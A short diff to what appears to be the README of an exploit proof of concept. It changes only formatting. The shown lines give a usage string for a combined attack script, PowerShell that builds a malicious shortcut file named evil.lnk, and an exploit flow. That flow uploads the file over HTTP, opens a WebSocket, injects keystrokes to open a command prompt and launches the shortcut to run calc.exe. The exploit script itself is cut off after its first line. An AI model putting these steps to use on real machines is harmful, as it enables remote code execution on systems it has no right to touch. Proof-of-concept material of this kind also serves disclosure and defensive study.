@@ -9,7 +9,7 @@
 ```bash
 USAGE : python3 combined_script.py <target_ip> <path_to_lnk_file>
 ```
-"""
+
 ### Create Malicious LNK File (evil.lnk)
 ```powershell
 $WshShell = New-Object -ComObject WScript.Shell
@@ -21,11 +21,10 @@ $Shortcut.IconLocation = "%SystemRoot%\System32\shell32.dll,1"
 $Shortcut.Save()
 ```
 
-Exploit Flow: Upload evil.lnk via HTTP POST → Establish WebSocket → Simulate Ctrl+Esc + cmd + Enter → Execute LNK via for %i in ("%USERPROFILE%\Desktop\*evil.lnk") do start "" "%i"
-You will be see opening calc.exe
+**Exploit Flow: Upload evil.lnk via HTTP POST → Establish WebSocket → Simulate Ctrl+Esc + cmd + Enter → Execute LNK via for %i in ("%USERPROFILE%\Desktop\*evil.lnk") do start "" "%i"
+You will be see opening calc.exe**
 
 
-"""
 ### EXPLOIT
 ```
 #!/usr/bin/env python3
